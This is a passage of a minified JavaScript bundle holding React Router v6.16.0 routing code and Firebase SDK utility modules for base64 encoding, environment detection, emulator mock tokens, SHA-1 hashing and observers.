n&&(a.route.ErrorBoundary||a.route.errorElement||u===0)?I.createElement(BC,{location:n.location,revalidation:n.revalidation,component:d,error:c,children:m(),routeContext:{outlet:null,matches:h,isDataRoute:!0}}):m()},null)}var K_=function(t){return t.UseBlocker="useBlocker",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t}(K_||{}),vl=function(t){return t.UseBlocker="useBlocker",t.UseLoaderData="useLoaderData",t.UseActionData="useActionData",t.UseRouteError="useRouteError",t.UseNavigation="useNavigation",t.UseRouteLoaderData="useRouteLoaderData",t.UseMatches="useMatches",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t.UseRouteId="useRouteId",t}(vl||{});function $C(t){let e=I.useContext(Fd);return e||de(!1),e}function VC(t){let e=I.useContext(V_);return e||de(!1),e}function qC(t){let e=I.useContext(bn);return e||de(!1),e}function Y_(t){let e=qC(),n=e.matches[e.matches.length-1];return n.route.id||de(!1),n.route.id}function GC(){var t;let e=I.useContext(q_),n=VC(vl.UseRouteError),r=Y_(vl.UseRouteError);return e||((t=n.errors)==null?void 0:t[r])}function KC(){let{router:t}=$C(K_.UseNavigateStable),e=Y_(vl.UseNavigateStable),n=I.useRef(!1);return G_(()=>{n.current=!0}),I.useCallback(function(i,s){s===void 0&&(s={}),n.current&&(typeof i=="number"?t.navigate(i):t.navigate(i,_l({fromRouteId:e},s)))},[t,e])}function Fn(t){de(!1)}function YC(t){let{basename:e="/",children:n=null,location:r,navigationType:i=hn.Pop,navigator:s,static:o=!1}=t;$s()&&de(!1);let l=e.replace(/^\/*/,"/"),a=I.useMemo(()=>({basename:l,navigator:s,static:o}),[l,s,o]);typeof r=="string"&&(r=mi(r));let{pathname:u="/",search:c="",hash:d="",state:h=null,key:m="default"}=r,_=I.useMemo(()=>{let v=Ud(u,l);return v==null?null:{location:{pathname:v,search:c,hash:d,state:h,key:m},navigationType:i}},[l,u,c,d,h,m,i]);return _==null?null:I.createElement(mr.Provider,{value:a},I.createElement(aa.Provider,{children:n,value:_}))}function QC(t){let{children:e,location:n}=t;return UC(mc(e),n)}new Promise(()=>{});function mc(t,e){e===void 0&&(e=[]);let n=[];return I.Children.forEach(t,(r,i)=>{if(!I.isValidElement(r))return;let s=[...e,i];if(r.type===I.Fragment){n.push.apply(n,mc(r.props.children,s));return}r.type!==Fn&&de(!1),!r.props.index||!r.props.children||de(!1);let o={id:r.props.id||s.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=mc(r.props.children,s)),n.push(o)}),n}/**
 * React Router DOM v6.16.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function yl(){return yl=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},yl.apply(this,arguments)}function Q_(t,e){if(t==null)return{};var n={},r=Object.keys(t),i,s;for(s=0;s<r.length;s++)i=r[s],!(e.indexOf(i)>=0)&&(n[i]=t[i]);return n}function XC(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function JC(t,e){return t.button===0&&(!e||e==="_self")&&!XC(t)}const ZC=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset"],eS=["aria-current","caseSensitive","className","end","style","to","children"],tS="startTransition",sp=Zw[tS];function nS(t){let{basename:e,children:n,future:r,window:i}=t,s=I.useRef();s.current==null&&(s.current=cC({window:i,v5Compat:!0}));let o=s.current,[l,a]=I.useState({action:o.action,location:o.location}),{v7_startTransition:u}=r||{},c=I.useCallback(d=>{u&&sp?sp(()=>a(d)):a(d)},[a,u]);return I.useLayoutEffect(()=>o.listen(c),[o,c]),I.createElement(YC,{basename:e,children:n,location:l.location,navigationType:l.action,navigator:o})}const rS=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",iS=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,sS=I.forwardRef(function(e,n){let{onClick:r,relative:i,reloadDocument:s,replace:o,state:l,target:a,to:u,preventScrollReset:c}=e,d=Q_(e,ZC),{basename:h}=I.useContext(mr),m,_=!1;if(typeof u=="string"&&iS.test(u)&&(m=u,rS))try{let f=new URL(window.location.href),g=u.startsWith("//")?new URL(f.protocol+u):new URL(u),y=Ud(g.pathname,h);g.origin===f.origin&&y!=null?u=y+g.search+g.hash:_=!0}catch{}let v=DC(u,{relative:i}),w=oS(u,{replace:o,state:l,target:a,preventScrollReset:c,relative:i});function p(f){r&&r(f),f.defaultPrevented||w(f)}return I.createElement("a",yl({},d,{href:m||v,onClick:_||s?r:p,ref:n,target:a}))}),op=I.forwardRef(function(e,n){let{"aria-current":r="page",caseSensitive:i=!1,className:s="",end:o=!1,style:l,to:a,children:u}=e,c=Q_(e,eS),d=zd(a,{relative:c.relative}),h=Vs(),m=I.useContext(V_),{navigator:_}=I.useContext(mr),v=_.encodeLocation?_.encodeLocation(d).pathname:d.pathname,w=h.pathname,p=m&&m.navigation&&m.navigation.location?m.navigation.location.pathname:null;i||(w=w.toLowerCase(),p=p?p.toLowerCase():null,v=v.toLowerCase());let f=w===v||!o&&w.startsWith(v)&&w.charAt(v.length)==="/",g=p!=null&&(p===v||!o&&p.startsWith(v)&&p.charAt(v.length)==="/"),y=f?r:void 0,T;typeof s=="function"?T=s({isActive:f,isPending:g}):T=[s,f?"active":null,g?"pending":null].filter(Boolean).join(" ");let k=typeof l=="function"?l({isActive:f,isPending:g}):l;return I.createElement(sS,yl({},c,{"aria-current":y,className:T,ref:n,style:k,to:a}),typeof u=="function"?u({isActive:f,isPending:g}):u)});var lp;(function(t){t.UseScrollRestoration="useScrollRestoration",t.UseSubmit="useSubmit",t.UseSubmitFetcher="useSubmitFetcher",t.UseFetcher="useFetcher"})(lp||(lp={}));var ap;(function(t){t.UseFetchers="useFetchers",t.UseScrollRestoration="useScrollRestoration"})(ap||(ap={}));function oS(t,e){let{target:n,replace:r,state:i,preventScrollReset:s,relative:o}=e===void 0?{}:e,l=oi(),a=Vs(),u=zd(t,{relative:o});return I.useCallback(c=>{if(JC(c,n)){c.preventDefault();let d=r!==void 0?r:gl(a)===gl(u);l(t,{replace:d,state:i,preventScrollReset:s,relative:o})}},[a,l,u,r,i,n,t,s,o])}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const X_={NODE_CLIENT:!1,NODE_ADMIN:!1,SDK_VERSION:"${JSCORE_VERSION}"};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const S=function(t,e){if(!t)throw gi(e)},gi=function(t){return new Error("Firebase Database ("+X_.SDK_VERSION+") INTERNAL ASSERT FAILED: "+t)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const J_=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):(i&64512)===55296&&r+1<t.length&&(t.charCodeAt(r+1)&64512)===56320?(i=65536+((i&1023)<<10)+(t.charCodeAt(++r)&1023),e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},lS=function(t){const e=[];let n=0,r=0;for(;n<t.length;){const i=t[n++];if(i<128)e[r++]=String.fromCharCode(i);else if(i>191&&i<224){const s=t[n++];e[r++]=String.fromCharCode((i&31)<<6|s&63)}else if(i>239&&i<365){const s=t[n++],o=t[n++],l=t[n++],a=((i&7)<<18|(s&63)<<12|(o&63)<<6|l&63)-65536;e[r++]=String.fromCharCode(55296+(a>>10)),e[r++]=String.fromCharCode(56320+(a&1023))}else{const s=t[n++],o=t[n++];e[r++]=String.fromCharCode((i&15)<<12|(s&63)<<6|o&63)}}return e.join("")},Bd={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(t,e){if(!Array.isArray(t))throw Error("encodeByteArray takes an array as a parameter");this.init_();const n=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let i=0;i<t.length;i+=3){const s=t[i],o=i+1<t.length,l=o?t[i+1]:0,a=i+2<t.length,u=a?t[i+2]:0,c=s>>2,d=(s&3)<<4|l>>4;let h=(l&15)<<2|u>>6,m=u&63;a||(m=64,o||(h=64)),r.push(n[c],n[d],n[h],n[m])}return r.join("")},encodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(t):this.encodeByteArray(J_(t),e)},decodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(t):lS(this.decodeStringToByteArray(t,e))},decodeStringToByteArray(t,e){this.init_();const n=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let i=0;i<t.length;){const s=n[t.charAt(i++)],l=i<t.length?n[t.charAt(i)]:0;++i;const u=i<t.length?n[t.charAt(i)]:64;++i;const d=i<t.length?n[t.charAt(i)]:64;if(++i,s==null||l==null||u==null||d==null)throw new aS;const h=s<<2|l>>4;if(r.push(h),u!==64){const m=l<<4&240|u>>2;if(r.push(m),d!==64){const _=u<<6&192|d;r.push(_)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let t=0;t<this.ENCODED_VALS.length;t++)this.byteToCharMap_[t]=this.ENCODED_VALS.charAt(t),this.charToByteMap_[this.byteToCharMap_[t]]=t,this.byteToCharMapWebSafe_[t]=this.ENCODED_VALS_WEBSAFE.charAt(t),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[t]]=t,t>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(t)]=t,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(t)]=t)}}};class aS extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const Z_=function(t){const e=J_(t);return Bd.encodeByteArray(e,!0)},wl=function(t){return Z_(t).replace(/\./g,"")},El=function(t){try{return Bd.decodeString(t,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function uS(t){return ev(void 0,t)}function ev(t,e){if(!(e instanceof Object))return e;switch(e.constructor){case Date:const n=e;return new Date(n.getTime());case Object:t===void 0&&(t={});break;case Array:t=[];break;default:return e}for(const n in e)!e.hasOwnProperty(n)||!cS(n)||(t[n]=ev(t[n],e[n]));return t}function cS(t){return t!=="__proto__"}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function dS(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const hS=()=>dS().__FIREBASE_DEFAULTS__,fS=()=>{if(typeof process>"u"||typeof process.env>"u")return;const t={}.__FIREBASE_DEFAULTS__;if(t)return JSON.parse(t)},pS=()=>{if(typeof document>"u")return;let t;try{t=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=t&&El(t[1]);return e&&JSON.parse(e)},ua=()=>{try{return hS()||fS()||pS()}catch(t){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${t}`);return}},tv=t=>{var e,n;return(n=(e=ua())===null||e===void 0?void 0:e.emulatorHosts)===null||n===void 0?void 0:n[t]},nv=t=>{const e=tv(t);if(!e)return;const n=e.lastIndexOf(":");if(n<=0||n+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const r=parseInt(e.substring(n+1),10);return e[0]==="["?[e.substring(1,n-1),r]:[e.substring(0,n),r]},rv=()=>{var t;return(t=ua())===null||t===void 0?void 0:t.config},iv=t=>{var e;return(e=ua())===null||e===void 0?void 0:e[`_${t}`]};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ca{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}wrapCallback(e){return(n,r)=>{n?this.reject(n):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(n):e(n,r))}}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function sv(t,e){if(t.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const n={alg:"none",type:"JWT"},r=e||"demo-project",i=t.iat||0,s=t.sub||t.user_id;if(!s)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const o=Object.assign({iss:`https://securetoken.google.com/${r}`,aud:r,iat:i,exp:i+3600,auth_time:i,sub:s,user_id:s,firebase:{sign_in_provider:"custom",identities:{}}},t),l="";return[wl(JSON.stringify(n)),wl(JSON.stringify(o)),l].join(".")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ae(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function Hd(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(Ae())}function mS(){var t;const e=(t=ua())===null||t===void 0?void 0:t.forceEnvironment;if(e==="node")return!0;if(e==="browser")return!1;try{return Object.prototype.toString.call(global.process)==="[object process]"}catch{return!1}}function gS(){const t=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof t=="object"&&t.id!==void 0}function ov(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function _S(){const t=Ae();return t.indexOf("MSIE ")>=0||t.indexOf("Trident/")>=0}function lv(){return X_.NODE_ADMIN===!0}function vS(){try{return typeof indexedDB=="object"}catch{return!1}}function yS(){return new Promise((t,e)=>{try{let n=!0;const r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),n||self.indexedDB.deleteDatabase(r),t(!0)},i.onupgradeneeded=()=>{n=!1},i.onerror=()=>{var s;e(((s=i.error)===null||s===void 0?void 0:s.message)||"")}}catch(n){e(n)}})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wS="FirebaseError";class Yt extends Error{constructor(e,n,r){super(n),this.code=e,this.customData=r,this.name=wS,Object.setPrototypeOf(this,Yt.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,qs.prototype.create)}}class qs{constructor(e,n,r){this.service=e,this.serviceName=n,this.errors=r}create(e,...n){const r=n[0]||{},i=`${this.service}/${e}`,s=this.errors[e],o=s?ES(s,r):"Error",l=`${this.serviceName}: ${o} (${i}).`;return new Yt(i,l,r)}}function ES(t,e){return t.replace(CS,(n,r)=>{const i=e[r];return i!=null?String(i):`<${r}?>`})}const CS=/\{\$([^}]+)}/g;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Is(t){return JSON.parse(t)}function ye(t){return JSON.stringify(t)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const av=function(t){let e={},n={},r={},i="";try{const s=t.split(".");e=Is(El(s[0])||""),n=Is(El(s[1])||""),i=s[2],r=n.d||{},delete n.d}catch{}return{header:e,claims:n,data:r,signature:i}},SS=function(t){const e=av(t),n=e.claims;return!!n&&typeof n=="object"&&n.hasOwnProperty("iat")},TS=function(t){const e=av(t).claims;return typeof e=="object"&&e.admin===!0};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Qt(t,e){return Object.prototype.hasOwnProperty.call(t,e)}function li(t,e){if(Object.prototype.hasOwnProperty.call(t,e))return t[e]}function gc(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}function Cl(t,e,n){const r={};for(const i in t)Object.prototype.hasOwnProperty.call(t,i)&&(r[i]=e.call(n,t[i],i,t));return r}function Sl(t,e){if(t===e)return!0;const n=Object.keys(t),r=Object.keys(e);for(const i of n){if(!r.includes(i))return!1;const s=t[i],o=e[i];if(up(s)&&up(o)){if(!Sl(s,o))return!1}else if(s!==o)return!1}for(const i of r)if(!n.includes(i))return!1;return!0}function up(t){return t!==null&&typeof t=="object"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function _i(t){const e=[];for(const[n,r]of Object.entries(t))Array.isArray(r)?r.forEach(i=>{e.push(encodeURIComponent(n)+"="+encodeURIComponent(i))}):e.push(encodeURIComponent(n)+"="+encodeURIComponent(r));return e.length?"&"+e.join("&"):""}function $i(t){const e={};return t.replace(/^\?/,"").split("&").forEach(r=>{if(r){const[i,s]=r.split("=");e[decodeURIComponent(i)]=decodeURIComponent(s)}}),e}function Vi(t){const e=t.indexOf("?");if(!e)return"";const n=t.indexOf("#",e);return t.substring(e,n>0?n:void 0)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class IS{constructor(){this.chain_=[],this.buf_=[],this.W_=[],this.pad_=[],this.inbuf_=0,this.total_=0,this.blockSize=512/8,this.pad_[0]=128;for(let e=1;e<this.blockSize;++e)this.pad_[e]=0;this.reset()}reset(){this.chain_[0]=1732584193,this.chain_[1]=4023233417,this.chain_[2]=2562383102,this.chain_[3]=271733878,this.chain_[4]=3285377520,this.inbuf_=0,this.total_=0}compress_(e,n){n||(n=0);const r=this.W_;if(typeof e=="string")for(let d=0;d<16;d++)r[d]=e.charCodeAt(n)<<24|e.charCodeAt(n+1)<<16|e.charCodeAt(n+2)<<8|e.charCodeAt(n+3),n+=4;else for(let d=0;d<16;d++)r[d]=e[n]<<24|e[n+1]<<16|e[n+2]<<8|e[n+3],n+=4;for(let d=16;d<80;d++){const h=r[d-3]^r[d-8]^r[d-14]^r[d-16];r[d]=(h<<1|h>>>31)&4294967295}let i=this.chain_[0],s=this.chain_[1],o=this.chain_[2],l=this.chain_[3],a=this.chain_[4],u,c;for(let d=0;d<80;d++){d<40?d<20?(u=l^s&(o^l),c=1518500249):(u=s^o^l,c=1859775393):d<60?(u=s&o|l&(s|o),c=2400959708):(u=s^o^l,c=3395469782);const h=(i<<5|i>>>27)+u+a+c+r[d]&4294967295;a=l,l=o,o=(s<<30|s>>>2)&4294967295,s=i,i=h}this.chain_[0]=this.chain_[0]+i&4294967295,this.chain_[1]=this.chain_[1]+s&4294967295,this.chain_[2]=this.chain_[2]+o&4294967295,this.chain_[3]=this.chain_[3]+l&4294967295,this.chain_[4]=this.chain_[4]+a&4294967295}update(e,n){if(e==null)return;n===void 0&&(n=e.length);const r=n-this.blockSize;let i=0;const s=this.buf_;let o=this.inbuf_;for(;i<n;){if(o===0)for(;i<=r;)this.compress_(e,i),i+=this.blockSize;if(typeof e=="string"){for(;i<n;)if(s[o]=e.charCodeAt(i),++o,++i,o===this.blockSize){this.compress_(s),o=0;break}}else for(;i<n;)if(s[o]=e[i],++o,++i,o===this.blockSize){this.compress_(s),o=0;break}}this.inbuf_=o,this.total_+=n}digest(){const e=[];let n=this.total_*8;this.inbuf_<56?this.update(this.pad_,56-this.inbuf_):this.update(this.pad_,this.blockSize-(this.inbuf_-56));for(let i=this.blockSize-1;i>=56;i--)this.buf_[i]=n&255,n/=256;this.compress_(this.buf_);let r=0;for(let i=0;i<5;i++)for(let s=24;s>=0;s-=8)e[r]=this.chain_[i]>>s&255,++r;return e}}function kS(t,e){const n=new RS(t,e);return n.subscribe.bind(n)}class RS{constructor(e,n){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=n,this.task.then(()=>{e(this)}).catch(r=>{this.error(r)})}next(e){this.forEachObserver(n=>{n.next(e)})}error(e){this.forEachObserver(n=>{n.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,n,r){let i;if(e===void 0&&n===void 0&&r===void 0)throw new Error("Missing Observer.");NS(e,["next","error","complete"])?i=e:i={next:e,error:n,complete:r},i.next===void 0&&(i.next=tu),i.error===void 0&&(i.error=tu),i.complete===void 0&&(i.complete=tu);const s=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?i.error(this.finalError):i.complete()}catch{}}),this.observers.push(i),s}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let n=0;n<this.observers.length;n++)this.sendOne(n,e)}sendOne(e,n){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{n(this.observers[e])}catch(r){typeof console<"u"&&console.error&&console.error(r)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function NS(t,e){if(typeof t!="object"||t===null)return!1;for(const n of e)if(n in t&&typeof t[n]=="function")return!0;return!1}function tu(){}function Wd(t,e){return`${t} failed: ${e} argument `}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const PS=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);if(i>=55296&&i<=56319){const s=i-55296;r++,S(r<t.length,"Surrogate pair missing trail surrogate.");const o=t.charCodeAt(r)-56320;i=65536+(s<<10)+o}i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):i<65536?(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},da=function(t){let e=0;for(let n=0;n<t.length;n++){const r=t.charCodeAt(n);r<128?e++:r<2048?e+=2:r>=55296&&r<=56319?(e+=4,n++):e+=3}return e};/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ie(t){return t&&t._delegate?t._delegate:t}class Rn{constructor(e,n,r){this.name=e,this.instanceFactory=n,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}/**
 * @license
